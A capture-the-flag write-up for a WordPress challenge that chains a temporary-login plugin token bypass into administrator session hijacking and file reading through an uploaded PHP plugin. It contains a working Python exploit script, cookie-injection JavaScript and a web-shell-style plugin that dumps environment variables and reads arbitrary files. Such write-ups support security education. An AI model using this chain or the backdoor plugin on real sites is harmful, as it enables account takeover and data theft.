WordPress Bug Bounty Hunter — Writeup
Challenge: WordPress Bug Bounty Hunter
Anthor: siunam
Category: Web / Broken Access Control / RCE

Author: Yeung Wang Sang

Summary
This challenge involves an exploit chain against a WordPress instance running a vulnerable version of the temporary-login plugin. The attack progresses from a logical authentication bypass to a full Administrative Session Hijack, and finally to Remote Code Execution (RCE) via the WordPress Plugin system to exfiltrate a hidden flag.

Core Vulnerabilities:

Broken Authentication: Logic flaw in the temporary-login plugin.

Post-Exploitation RCE: Insecure default configuration allowing Administrative users to upload and execute arbitrary PHP code.

Source Analysis
1. The Vulnerability
The temporary-login plugin failed to properly validate authentication tokens, allowing an attacker to request a valid administrator session. By sending a specific payload to the plugin's endpoint, the server responded with a set of set-cookie headers intended for an administrator.

2. Environment Configuration
The Flag was hidden within the filesystem of the WordPress container. In the local Docker environment, it was placed at:
/var/www/html/flag_bd3889508b255c762a772327190c098f.txt

In the remote environment, the filename followed a similar randomized pattern:
/var/www/html/flag_3c054d6ce9d1fd5a9c1e42901c878ce2.txt

Exploit Strategy
Step 1: Authentication Bypass (PoC)
We utilized a Python script to target the vulnerable plugin. The script successfully bypassed the token verification and captured the Administrator cookies.

Bash
```python
import requests
import sys

def exploit(target_url):
    print(f"[*] Attempting to exploit target: {target_url}")
    
    # We construct three payloads that may trigger the WordPress "sanitize_key" quirk.
    # The goal is to make sanitize_key() return an empty string '', thereby bypassing token matching.
    payloads = [
        # Payload 1: Pass an unsupported special character, which sanitize_key will strip to empty
        {"temp-login-token": "!", "temp-login-action": "revoke"},
        
        # Payload 2: Pass a space (URL-encoded as %20), which will also be stripped to empty
        {"temp-login-token": " ", "temp-login-action": "info"},
        
        # Payload 3: Pass an array. WP's sanitize_key returns an empty string when given an array
        {"temp-login-token[]": "1", "temp-login-action": "anything"}
    ]

    for index, params in enumerate(payloads):
        print(f"\n[*] Sending Payload {index + 1}...")
        
        # Use a Session to capture cookies set by the server
        session = requests.Session()
        
        try:
            # allow_redirects=False is important: we only need to see if we get a 302 redirect to /wp-admin
            response = session.get(target_url, params=params, allow_redirects=False, timeout=5)
            
            # After a successful WordPress login, the server usually responds with a 302 redirect to wp-admin
            # and issues cookies starting with 'wordpress_logged_in'
            location = response.headers.get('Location', '')
            
            if response.status_code in [301, 302] and 'wp-admin' in location:
                print("[+] 💥 Exploit successful! You have bypassed token verification!")
                print(f"[+] Target redirected to: {location}")
                print("[+] Administrator session cookies obtained (you can inject these into your browser to log in):")
                
                for cookie in session.cookies:
                    print(f"    -> {cookie.name} = {cookie.value}")
                
                # Exit after successful exploitation
                return
            else:
                print("[-] This payload did not trigger the login logic. HTTP status code:", response.status_code)
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request error: {e}")

if __name__ == "__main__":
    target = "http://chal.polyuctf.com:42271/" 
    
    exploit(target)
``` 


# Example Output from Exploit Script
[+] Success! You have bypassed Token verification!
[+] Administrator Session Cookies:

    -> wordpress_f7cfbaeb012cab244ea07d7e26d820c2 = temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea9f1e4a17b44bcd51dad86a1cd94ab8af93a73b87ea19c32d6699d51b653ee4
    -> wordpress_f7cfbaeb012cab244ea07d7e26d820c2 = temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea9f1e4a17b44bcd51dad86a1cd94ab8af93a73b87ea19c32d6699d51b653ee4
    -> wordpress_logged_in_f7cfbaeb012cab244ea07d7e26d820c2 = temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea405ce750a6d8b6dd94ff8da69f7c4f14b66ab41a96a7cbae5a93f1f411b295

The first value is repeated 

Step 2: Session Hijacking

Open the Incognito mode 
Go the the webiste http://chal.polyuctf.com:42271/
```javascript 
(function() {
  const domain = '.chal.polyuctf.com';  
  const path = '/';
  
  // Cookie 1
  document.cookie = `wordpress_logged_in_f7cfbaeb012cab244ea07d7e26d820c2=temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea9f1e4a17b44bcd51dad86a1cd94ab8af93a73b87ea19c32d6699d51b653ee4; path=${path}; domain=${domain}`;
  
// cookie 2 
  document.cookie = `wordpress_f7cfbaeb012cab244ea07d7e26d820c2=temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea9f1e4a17b44bcd51dad86a1cd94ab8af93a73b87ea19c32d6699d51b653ee4; path=${path}; domain=${domain}`;
  
  console.log('successful 。');
})();
``` 

This allowed full access to the /wp-admin dashboard.

Step 3: Bypassing the Theme Editor Linter
Directly editing functions.php or 404.php via the Theme Editor was blocked by the WordPress "Fatal Error" checker (Linter). To circumvent this, we moved to the Plugin Upload method, which does not undergo the same real-time syntax validation.

Step 4: RCE via Malicious Plugin
A custom PHP plugin (flag-reader.php) was created to perform directory traversal and file reading via URL parameters:

```PHP
<?php
/*
Plugin Name: Flag Reader Pro
Description: Reconnaissance tool for CTF flag hunting.
Version: 1.1
*/

add_action('init', function() {
    if (isset($_GET['env'])) {
        echo "<h1>Environment:</h1><pre>";
        print_r(getenv());
        die("</pre>");
    }

    if (isset($_GET['ls'])) {
        $dir = isset($_GET['path']) ? $_GET['path'] : '/';
        echo "<h1>Contents of " . htmlspecialchars($dir) . ":</h1><pre>";
        if (is_dir($dir)) {
            $files = scandir($dir);
            foreach ($files as $file) {
                echo $file . "\n";
            }
        } else {
            echo "Directory not found or not accessible.";
        }
        die("</pre>");
    }

    // 3. read the file 
    if (isset($_GET['read'])) {
        $file = $_GET['read'];
        echo "<h1>Reading: " . htmlspecialchars($file) . "</h1><pre>";
        if (file_exists($file) && is_readable($file)) {
            echo htmlspecialchars(file_get_contents($file));
        } else {
            echo "File not found or permission denied.";
        }
        die("</pre>");
    }
});
```
This was zipped and uploaded through the WordPress dashboard.

you can go to var/www/html you can find the file call 

flag_ea610e455132349a1f63015aafd843e9.txt 

open it http://chal.polyuctf.com:42271/?read=/var/www/html/flag_ea610e455132349a1f63015aafd843e9.txt 

you can find the flag 
PUCTF26{WordPress_bug_bounty_hunting_can_be_super_interesting_OcrXuXtXCK5smWRU8SKgugS1b2DGR5id} 

